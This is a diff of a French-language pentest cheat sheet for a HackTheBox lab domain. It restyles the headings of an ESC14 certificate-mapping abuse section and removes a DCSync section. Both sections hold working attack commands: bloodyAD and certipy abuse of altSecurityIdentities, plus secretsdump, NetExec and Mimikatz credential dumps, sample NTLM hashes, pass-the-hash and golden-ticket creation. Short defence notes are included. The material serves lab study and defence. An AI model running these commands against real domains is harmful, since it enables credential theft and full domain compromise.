@@ -8,7 +8,7 @@
 
 ESC14 exploite la capacité d'écrire l'attribut `altSecurityIdentities` d'un utilisateur. Cet attribut définit des identités alternatives pour l'authentification par certificat.
 
-#### 🔍 Types de mapping
+#### <mark style="color:green;">🔍 Types de mapping</mark>
 
 ```
 X509:<I>IssuerName<S>SubjectName     # Fort (SAN)
@@ -17,13 +17,13 @@ X509:<RFC822>email@domain.com        # FAIBLE (email uniquement)
 X509:<SKI>SubjectKeyIdentifier       # Fort
 ```
 
-#### 🎯 Prérequis
+#### <mark style="color:green;">🎯 Prérequis</mark>
 
 * Permission `WriteProperty` sur `altSecurityIdentities` d'un utilisateur cible
 * Capacité d'enrollment sur un template de certificat
 * Contrôle sur un utilisateur pouvant modifier son propre email
 
-#### 🔍 Enumération
+#### <mark style="color:green;">🔍 Enumération</mark>
 
 **Trouver les DACLs vulnérables**
 
@@ -55,7 +55,7 @@ bloodyAD --host dc01.scepter.htb -d scepter.htb -u user -p pass \
     get object p.adams --attr altSecurityIdentities
 ```
 
-#### 💣 Exploitation - Méthode 1 : RFC822 (Email)
+#### <mark style="color:green;">💣 Exploitation - Méthode 1 : RFC822 (Email)</mark>
 
 **Étape 1 : Définir altSecurityIdentities sur la cible**
 
@@ -89,7 +89,9 @@ certipy auth -pfx d.baker.pfx -username p.adams \
     -domain scepter.htb -dc-ip <DC_IP>
 ```
 
-#### 💣 Exploitation - Méthode 2 : Issuer+Serial
+***
+
+#### <mark style="color:green;">💣 Exploitation - Méthode 2 : Issuer+Serial</mark>
 
 **Étape 1 : Obtenir les détails du certificat**
 
@@ -161,7 +163,7 @@ certipy auth -pfx d.baker.pfx -username p.adams \
     -domain scepter.htb -dc-ip <DC_IP>
 ```
 
-#### 🎯 Différences entre les méthodes
+#### <mark style="color:green;">🎯 Différences entre les méthodes</mark>
 
 | Méthode       | Complexité | Prérequis                            | Fiabilité  |
 | ------------- | ---------- | ------------------------------------ | ---------- |
@@ -173,140 +175,5 @@ certipy auth -pfx d.baker.pfx -username p.adams \
 * Activer Strong Certificate Mapping
 * Auditer les permissions sur `altSecurityIdentities`
 * Utiliser CertificateMappingMethods=0x1F (tous les types forts)
-
-***
-
-### 6. DCSync Attack
-
-#### 📖 Concept
-
-DCSync abuse le protocole de réplication DRSUAPI pour extraire les secrets du domaine (hashes NTLM, Kerberos keys) sans toucher au disque NTDS.dit.
-
-#### 🎯 Prérequis (un de ces groupes)
-
-* Domain Admins
-* Enterprise Admins
-* **Replication Operators** ⚠️ (cas de Scepter)
-* Tout utilisateur avec `DS-Replication-Get-Changes` et `DS-Replication-Get-Changes-All`
-
-#### 🔍 Enumération
-
-**Vérifier les permissions DCSync**
-
-```bash
-# Avec BloodyAD
-bloodyAD --host dc01.scepter.htb -d scepter.htb -u user -p pass \
-    get object "DC=scepter,DC=htb" --attr nTSecurityDescriptor
-
-# Avec PowerView
-Get-DomainObjectAcl -SearchBase "DC=scepter,DC=htb" | 
-    Where-Object {$_.ObjectAceType -match "Replication"}
-```
-
-**BloodHound query**
-
-```cypher
-MATCH p=(u:User)-[:MemberOf*1..]->(g:Group)
-WHERE g.name =~ "(?i).*replication.*"
-RETURN p
-```
-
-#### 💣 Exploitation
-
-**Méthode 1 : secretsdump.py (Impacket)**
-
-```bash
-# Avec NTLM hash
-secretsdump.py scepter.htb/p.adams@dc01.scepter.htb \
-    -hashes :1b925c524f447bb821a8789c4b118ce0 -no-pass
-
-# Avec mot de passe
-secretsdump.py scepter.htb/p.adams:Password123@dc01.scepter.htb
-
-# Avec Kerberos
-export KRB5CCNAME=p.adams.ccache
-secretsdump.py -k -no-pass scepter.htb/p.adams@dc01.scepter.htb
-
-# Dump uniquement les hashes (sans les fichiers)
-secretsdump.py scepter.htb/p.adams@dc01.scepter.htb \
-    -hashes :HASH -just-dc
-```
-
-**Méthode 2 : NetExec**
-
-```bash
-# DCSync basique
-netexec smb dc01.scepter.htb -u p.adams -p Password123 \
-    -M ntdsutil
-
-# Avec hash
-netexec smb dc01.scepter.htb -u p.adams -H HASH --ntds
-
-# Extraire uniquement le hash Administrator
-netexec smb dc01.scepter.htb -u p.adams -H HASH --ntds \
-    --user Administrator
-```
-
-**Méthode 3 : Mimikatz (si shell)**
-
-```powershell
-# Sur la cible Windows
-lsadump::dcsync /domain:scepter.htb /user:Administrator
-```
-
-#### 📊 Sortie attendue
-
-```
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::
-[...]
-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::
-```
-
-#### 🔑 Utilisation des hashes
-
-**Pass-The-Hash**
-
-```bash
-evil-winrm -i dc01.scepter.htb -u administrator \
-    -H a291ead3493f9773dc615e66c2ea21c4
-```
-
-**Golden Ticket (avec krbtgt)**
-
-```bash
-impacket-ticketer -nthash c030fca580038cc8b1100ee37064a4a9 \
-    -domain-sid S-1-5-21-74879546-916818434-740295365 \
-    -domain scepter.htb administrator
-```
-
-#### ⚠️ Erreurs courantes
-
-**RemoteOperations failed: DCERPC Runtime Error**
-
-```
-[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
-[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
-```
-
-**Cause** : Erreur de connexion initiale, mais DCSync fonctionne quand même\
-**Solution** : Ignorer l'erreur, les hashes sont extraits
-
-**Access Denied**
-
-```
-[-] SMB SessionError: STATUS_ACCESS_DENIED
-```
-
-**Cause** : Pas de permissions DCSync\
-**Solution** : Vérifier le groupe/permissions de l'utilisateur
-
-#### 🛡️ Défense
-
-* Auditer les membres de Replication Operators
-* Monitorer les événements 4662 (réplication DRSUAPI)
-* Limiter les permissions DS-Replication-Get-Changes
 
 ***
